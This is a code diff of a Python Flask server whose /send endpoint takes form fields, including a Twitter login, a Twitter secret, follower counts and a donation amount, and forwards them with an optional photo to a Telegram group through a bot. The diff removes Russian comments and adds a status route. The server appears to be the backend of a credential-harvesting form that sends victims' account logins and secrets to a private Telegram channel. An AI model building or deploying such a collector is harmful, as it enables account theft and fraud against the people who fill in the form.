@@ -4,7 +4,6 @@ from io import BytesIO
 from flask import Flask, request, jsonify
 import telegram
 
-# Получение токена и ID группы из переменных окружения
 TOKEN = os.getenv("BOT_TOKEN")
 GROUP_ID = os.getenv("GROUP_ID")
 
@@ -14,9 +13,12 @@ if not TOKEN or not GROUP_ID:
 bot = telegram.Bot(token=TOKEN)
 app = Flask(__name__)
 
+@app.route('/')
+def index():
+    return "Server is running. Use POST /send to send data."
+
 @app.route('/send', methods=['POST'])
 def send_to_telegram():
-    # Получаем поля из формы
     twitter_login = request.form.get("twitter_login", "")
     twitter_secret = request.form.get("twitter_secret", "")
     twitter_followers = request.form.get("twitter_followers", "")
@@ -34,7 +36,6 @@ def send_to_telegram():
     account_usage_custom = request.form.get("account_usage_custom", "")
     donation_amount = request.form.get("donation_amount", "")
 
-    # Собираем подпись (caption) с информацией из формы
     caption_parts = [
         f"Twitter login: {twitter_login}",
         f"Twitter secret: {twitter_secret}",
@@ -48,12 +49,11 @@ def send_to_telegram():
         f"Custom usage: {account_usage_custom}",
         f"Donation amount: {donation_amount}",
     ]
-    caption = "\n".join(part for part in caption_parts if part.split(": ")[1].strip())  # только заполненные поля
+    caption = "\n".join(part for part in caption_parts if part.split(": ")[1].strip())
 
     photo_base64 = request.form.get("photoBase64") or request.form.get("photoData")
 
     if not photo_base64:
-        # Если фото нет, отправим только текст
         try:
             bot.send_message(chat_id=GROUP_ID, text=caption or "No message")
         except Exception as e:
@@ -78,7 +78,7 @@ def send_to_telegram():
 
     return jsonify({"success": True}), 200
 
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    # Запускаем на 0.0.0.0, чтобы был доступ извне
     app.run(host="0.0.0.0", port=port)
